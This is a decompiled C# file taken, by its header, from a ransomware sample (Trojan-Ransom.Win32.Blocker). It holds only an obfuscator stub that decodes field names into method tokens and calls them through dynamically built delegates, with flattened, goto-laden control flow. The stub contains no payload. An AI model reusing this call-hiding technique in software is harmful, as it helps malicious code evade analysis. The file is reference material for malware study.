// Decompiled with JetBrains decompiler
// Type: .
// Assembly: SEX2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=a5787988e1da7ee4
// MVID: 027F678B-7D46-4866-9354-BA5F76CF2B30
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.asdg-51ed8d1a92fbb8f059c9595d28994dd3b17eb92e.exe

using \u0001;
using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace \u0001
{
  internal static class \u0003
  {
    private static ModuleHandle \u0001;
    private static char[] \u0001;

    public static void \u0002([In] int obj0)
    {
      Type typeFromHandle;
      FieldInfo[] fields;
      int index1;
      FieldInfo fieldInfo;
      string name;
      bool flag;
      int num1;
      int index2;
      char ch;
      int index3;
      MethodInfo methodFromHandle;
      Delegate @delegate;
      ParameterInfo[] parameters;
      int length;
      Type[] parameterTypes;
      int index4;
      DynamicMethod dynamicMethod;
      ILGenerator ilGenerator;
      int num2;
      try
      {
        try
        {
          typeFromHandle = Type.GetTypeFromHandle(\u0003.\u0001.ResolveTypeHandle(33554433 + obj0));
        }
        catch
        {
          return;
        }
        if (true)
        {
          if (true)
          {
            fields = typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
            index1 = 0;
            goto label_51;
          }
          else
            goto label_45;
        }
label_28:
        parameters = methodFromHandle.GetParameters();
        int num3 = parameters.Length;
        int num4 = 1;
label_29:
        length = num3 + num4;
        parameterTypes = new Type[length];
        parameterTypes[0] = typeof (object);
        index4 = 1;
        goto label_33;
label_32:
        int num5;
        int num6;
        index4 = num5 + num6;
label_33:
        if (index4 < length)
        {
          if (true)
          {
            parameterTypes[index4] = parameters[index4 - 1].ParameterType;
            int num7 = index4;
            num6 = 1;
            num5 = num7;
            goto label_32;
          }
        }
        else
        {
          dynamicMethod = new DynamicMethod(string.Empty, methodFromHandle.ReturnType, parameterTypes, typeFromHandle, true);
          ilGenerator = dynamicMethod.GetILGenerator();
          ilGenerator.Emit(OpCodes.Ldarg_0);
          if (length > 1)
            ilGenerator.Emit(OpCodes.Ldarg_1);
        }
        int num8 = length;
        int num9 = 2;
label_37:
        if (num8 > num9)
          ilGenerator.Emit(OpCodes.Ldarg_2);
        if (length > 3)
          ilGenerator.Emit(OpCodes.Ldarg_3);
        if (length > 4)
        {
          for (num2 = 4; num2 < length; ++num2)
            ilGenerator.Emit(OpCodes.Ldarg_S, num2);
        }
label_45:
        ilGenerator.Emit(flag ? OpCodes.Callvirt : OpCodes.Call, methodFromHandle);
        ilGenerator.Emit(OpCodes.Ret);
        try
        {
          @delegate = dynamicMethod.CreateDelegate(typeFromHandle);
        }
        catch
        {
          goto label_50;
        }
label_48:
        try
        {
          fieldInfo.SetValue((object) null, (object) @delegate);
        }
        catch
        {
        }
label_50:
        ++index1;
label_51:
        if (index1 >= fields.Length)
          return;
        fieldInfo = fields[index1];
        name = fieldInfo.Name;
        flag = false;
        num1 = 0;
        index2 = name.Length - 1;
        int num10;
        int num11;
        int num12;
        int num13;
        while (true)
        {
          int num14 = index2;
          while (true)
          {
            if (num14 >= 0)
            {
              ch = name[index2];
              if (ch != '~')
              {
                index3 = 0;
                while (true)
                {
                  num5 = index3;
                  num6 = 8;
                  if (num6 != 0)
                  {
                    if (num6 != 0)
                    {
                      if (num5 < 58)
                      {
                        if ((int) \u0003.\u0001[index3] != (int) ch)
                        {
                          num10 = index3;
                          num11 = 1;
                          if (num11 != 0)
                            index3 = num10 + num11;
                          else
                            goto label_2;
                        }
                        else
                          goto label_13;
                      }
                      else
                        goto label_20;
                    }
                    else
                      break;
                  }
                  else
                    goto label_32;
                }
                num14 = num5;
              }
              else
                goto label_10;
            }
            else
              goto label_23;
          }
label_13:
          num12 = num1 * 58;
          num13 = index3;
          if (true)
            num1 = num12 + num13;
          else
            goto label_1;
label_20:
          --index2;
        }
label_10:
        flag = true;
label_23:
        try
        {
          methodFromHandle = (MethodInfo) MethodBase.GetMethodFromHandle(\u0003.\u0001.ResolveMethodHandle(num1 + 167772161));
        }
        catch
        {
          goto label_50;
        }
        if (methodFromHandle.IsStatic)
        {
          try
          {
            @delegate = Delegate.CreateDelegate(fieldInfo.FieldType, methodFromHandle);
            goto label_48;
          }
          catch (Exception ex)
          {
            goto label_50;
          }
        }
        else
          goto label_28;
label_1:
        num4 = num13;
        num3 = num12;
        goto label_29;
label_2:
        num9 = num11;
        num8 = num10;
        goto label_37;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[20]
        {
          (object) typeFromHandle,
          (object) fieldInfo,
          (object) name,
          (object) flag,
          (object) num1,
          (object) index2,
          (object) ch,
          (object) index3,
          (object) methodFromHandle,
          (object) @delegate,
          (object) parameters,
          (object) length,
          (object) parameterTypes,
          (object) index4,
          (object) dynamicMethod,
          (object) ilGenerator,
          (object) num2,
          (object) fields,
          (object) index1,
          (object) obj0
        };
        \u0008.\u0008.\u0002(ex, objArray);
        throw;
      }
    }

    static \u0003()
    {
      Type type1;
      try
      {
        \u0003.\u0001 = new char[58]
        {
          '\u0001',
          '\u0002',
          '\u0003',
          '\u0004',
          '\u0005',
          '\u0006',
          '\a',
          '\b',
          '\u000E',
          '\u000F',
          '\u0010',
          '\u0011',
          '\u0012',
          '\u0013',
          '\u0014',
          '\u0015',
          '\u0016',
          '\u0017',
          '\u0018',
          '\u0019',
          '\u001A',
          '\u001B',
          '\u001C',
          '\u001D',
          '\u001E',
          '\u001F',
          '\u007F',
          '\u0080',
          '\u0081',
          '\u0082',
          '\u0083',
          '\u0084',
          '\u0086',
          '\u0087',
          '\u0088',
          '\u0089',
          '\u008A',
          '\u008B',
          '\u008C',
          '\u008D',
          '\u008E',
          '\u008F',
          '\u0090',
          '\u0091',
          '\u0092',
          '\u0093',
          '\u0094',
          '\u0095',
          '\u0096',
          '\u0097',
          '\u0098',
          '\u0099',
          '\u009A',
          '\u009B',
          '\u009C',
          '\u009D',
          '\u009E',
          '\u009F'
        };
        if (true)
          type1 = typeof (MulticastDelegate);
        do
        {
          if ((object) type1 != null)
            goto label_6;
label_2:
          if (true)
            continue;
label_6:
          \u0003.\u0001 = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
          goto label_2;
        }
        while (false);
      }
      catch (Exception ex)
      {
        Type type2 = type1;
        \u0008.\u0008.\u0002(ex, (object) type2);
        throw;
      }
    }
  }
}
